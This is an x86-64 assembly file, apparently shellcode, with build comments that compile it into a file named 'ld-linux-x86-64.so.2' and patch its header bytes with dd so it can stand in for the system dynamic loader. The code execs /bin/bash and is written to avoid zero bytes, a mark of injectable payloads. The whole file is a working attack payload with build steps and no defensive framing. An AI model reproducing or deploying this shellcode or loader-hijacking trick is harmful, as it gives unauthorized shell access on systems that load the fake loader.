# gcc -o ./ld-linux-x86-64.so.2 lib.s -nostdlib
# printf '\x01\x01' | dd of=ld-linux-x86-64.so.2 bs=1 seek=320 count=2 conv=notrunc

.section .text

.globl _start

_start:
    # third argument of execve is envp, set to NULL
    xor %rdx, %rdx 

    # zero terminator
    push %rdx

    # space for string
    sub $16, %rsp

    # end is aligned to the zero terminator
    movb $0x2f, 7(%rsp)        # /
    movl $0x2f6e6962, 8(%rsp)  # bin/
    movl $0x68736162, 12(%rsp) # bash

    # first argument to execve is the file name
    leaq 7(%rsp), %rdi

    # push NULL to the stack, argv terminator
    pushq %rdx 

    # also argv[0]
    push %rdi

    # second argument to execve is argv
    mov %rsp, %rsi

    # copy 59 to rax, defining syscall number for execve
    # avoid zero byte
    xor %eax, %eax
    movb $59, %al 
    syscall
